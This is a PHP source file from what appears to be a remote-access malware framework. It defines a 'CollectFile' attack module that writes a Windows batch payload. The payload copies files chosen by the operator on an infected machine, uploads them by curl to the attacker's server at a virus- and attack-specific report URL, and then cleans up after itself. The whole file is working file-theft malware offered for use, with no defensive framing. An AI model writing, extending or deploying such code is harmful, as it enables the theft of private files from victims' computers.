<?php /** @noinspection PhpUnusedParameterInspection */

namespace Kelvinho\Virus\Attack\Packages\Windows\OneTime\CollectFile;

use Kelvinho\Virus\Attack\AttackBase;
use Kelvinho\Virus\Attack\BaseScriptWin;
use function Kelvinho\Virus\filter;
use function Kelvinho\Virus\map;

/**
 * Class CollectFile. Collects a bunch of files
 *
 * @package Kelvinho\Virus\Attack\Packages\Windows\OneTime
 * @author Quang Ho <157239q@gmail.com>
 * @copyright Copyright (c) 2020 Quang Ho <https://github.com/157239n>
 * @license http://www.opensource.org/licenses/mit-license.html  MIT License
 */
class CollectFile extends AttackBase {
    public array $fileNames = [];

    public function getFileNames(): array {
        return $this->fileNames;
    }

    public function setFileNames(string $fileNames): void {
        $this->fileNames = filter(map(explode("\n", $fileNames), function ($element) {
            return trim($element);
        }), function ($element) {
            return !empty($element);
        });
    }

    /** @noinspection PhpUnusedParameterInspection */

    public function getEmptyFiles(): array {
        return filter($this->fileNames, function ($element, $index) {
            $file = DATA_FILE . "/attacks/$this->attack_id/file$index";
            if (!file_exists($file)) return true;
            return filesize($file) === 0;
        }, null, false);
    }

    public function getNonEmptyFiles(): array {
        return filter($this->fileNames, function ($element, $index) {
            $file = DATA_FILE . "/attacks/$this->attack_id/file$index";
            if (file_exists($file)) {
                return filesize(DATA_FILE . "/attacks/$this->attack_id/file$index") !== 0;
            } else {
                return false;
            }
        }, null, false);
    }

    public function generateBatchCode(): void {
        //@formatter:off ?>
        chCp 65001
        <?php
        for ($i = 0; $i < count($this->fileNames); $i++) { ?>
            if exist "<?php echo $this->fileNames[$i]; ?>" (
                copy "<?php echo $this->fileNames[$i]; ?>" "%~pd0file<?php echo $i; ?>"
            ) else (
                copy nul "%~pd0file<?php echo $i; ?>"
            )
            <?php
        }
        echo BaseScriptWin::payloadConfirmationLoop($this->virus_id, $this->attack_id, $this->generateUploadCode());
        echo BaseScriptWin::cleanUpPayload();
        //@formatter:on
    }

    private function generateUploadCode(): string {
        ob_start(); //@formatter:off ?>
        curl --post301 --post302 --post303 -L <?php
        for ($i = 0; $i < count($this->fileNames); $i++) {
            echo "--form \"file$i=@%~pd0file$i\" ";
        }
        echo ALT_SECURE_DOMAIN . "/vrs/$this->virus_id/aks/$this->attack_id/report"; ?>
        <?php return ob_get_clean(); //@formatter:on
    }

    public function processExtras(string $resourceIdentifier): void {
    }

    protected function setState(string $json): void {
        $state = json_decode($json, true);
        $this->fileNames = $state["fileNames"];
    }

    protected function getState(): string {
        $state = [];
        $state["fileNames"] = $this->fileNames;
        return json_encode($state);
    }
}
